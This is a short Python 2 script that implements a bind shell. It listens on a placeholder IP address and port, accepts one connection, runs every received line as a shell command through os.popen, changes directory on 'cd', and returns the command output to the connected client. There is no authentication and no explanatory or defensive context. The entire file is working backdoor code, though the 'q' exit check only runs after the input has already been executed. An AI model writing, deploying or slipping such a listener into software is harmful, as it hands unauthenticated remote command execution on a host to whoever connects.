import socket
import os

serversocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)



#bind socket as IP and Port

serversocket.bind(('SERVER_IP_ADDRESS', PORT))



#Num of connection

serversocket.listen(1)



#socket open

(clientsocket, address) = serversocket.accept()


#socket communication

while 1:

    data = clientsocket.recv(512)
    data=data.replace("\r\n","")
    
    if data[:2]=='cd' : os.chdir(data[3:])    

    res = os.popen(data).read()

    clientsocket.send(res)
    
    if data=='q' : clientsocket.close()
